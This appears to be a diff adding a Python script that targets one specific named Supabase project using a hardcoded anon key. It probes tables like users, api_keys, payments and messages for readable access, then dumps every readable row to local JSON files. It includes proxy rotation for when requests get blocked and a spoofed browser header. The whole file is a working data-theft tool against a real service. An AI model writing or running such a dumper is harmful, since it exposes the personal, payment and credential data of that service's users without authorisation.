@@ -1,0 +1,116 @@
+import requests
+import json
+import os
+import time
+import random
+from datetime import datetime
+
+# ========================= CONFIG =========================
+SUPABASE_URL = "https://guewgygcpcmrcoppihzx.supabase.co"
+ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd1ZXdneWdjcGNtcmNvcHBpaHp4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI2Njk2NTMsImV4cCI6MjA4ODI0NTY1M30.V5Jw7wJgiMpSQPa2mt0ftjyye5ynG1qLlam00yPVNJY"          # ← REQUIRED
+
+USE_PROXIES = False                      # ← Change to True if you get blocked
+PROXIES_FILE = "proxies.txt"
+DUMP_FOLDER = "supabase_dump"
+# =========================================================
+
+headers = {
+    "apikey": ANON_KEY,
+    "Authorization": f"Bearer {ANON_KEY}",
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+}
+
+def load_proxies():
+    if not USE_PROXIES or not os.path.exists(PROXIES_FILE):
+        return [None]
+    with open(PROXIES_FILE, "r") as f:
+        return [f"http://{line.strip()}" for line in f if line.strip()]
+
+def get_request(url, params=None):
+    proxy = random.choice(load_proxies())
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    
+    try:
+        r = requests.get(url, headers=headers, params=params, proxies=proxies, timeout=25)
+        return r
+    except Exception as e:
+        print(f"    [-] Request failed: {e}")
+        return None
+
+def discover_tables():
+    print("[*] Discovering readable tables...")
+    tables = []
+    
+    # Common tables in AI/SaaS Supabase projects
+    common = ["users", "profiles", "accounts", "projects", "conversations", "messages", 
+              "credits", "api_keys", "subscriptions", "payments", "settings", "user_metadata"]
+    
+    for table in common:
+        resp = get_request(f"{SUPABASE_URL}/rest/v1/{table}?limit=1")
+        if resp and resp.status_code == 200:
+            tables.append(table)
+            print(f"    ✓ {table} (readable)")
+        elif resp and resp.status_code == 401:
+            print(f"    ✗ {table} → Permission denied")
+        elif resp and resp.status_code == 404:
+            print(f"    ✗ {table} → Not found")
+        time.sleep(0.6)
+    
+    return tables
+
+def dump_table(table_name):
+    print(f"[*] Dumping {table_name}...")
+    all_data = []
+    limit = 1000
+    offset = 0
+
+    while True:
+        params = {"select": "*", "limit": limit, "offset": offset}
+        resp = get_request(f"{SUPABASE_URL}/rest/v1/{table_name}", params=params)
+        
+        if not resp or resp.status_code != 200:
+            break
+        
+        data = resp.json()
+        if not data:
+            break
+            
+        all_data.extend(data)
+        print(f"    → Fetched {len(data)} rows (Total: {len(all_data)})")
+        
+        if len(data) < limit:
+            break
+            
+        offset += limit
+        time.sleep(0.7)
+
+    return all_data
+
+def main():
+    os.makedirs(DUMP_FOLDER, exist_ok=True)
+    print(f"[*] Starting Supabase Dump → {DUMP_FOLDER}/")
+    print(f"[*] Proxies: {'Enabled' if USE_PROXIES else 'Disabled'}")
+
+    tables = discover_tables()
+    summary = {"dumped_at": datetime.now().isoformat(), "tables": {}}
+
+    for table in tables:
+        data = dump_table(table)
+        if data:
+            filepath = os.path.join(DUMP_FOLDER, f"{table}.json")
+            with open(filepath, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+            
+            summary["tables"][table] = len(data)
+            print(f"[+] Saved {len(data)} rows → {table}.json\n")
+        time.sleep(1)
+
+    # Save summary
+    with open(os.path.join(DUMP_FOLDER, "SUMMARY.json"), "w", encoding="utf-8") as f:
+        json.dump(summary, f, indent=2)
+
+    print(f"\n[+] Dump finished! Check folder: {DUMP_FOLDER}/")
+
+if __name__ == "__main__":
+    main()
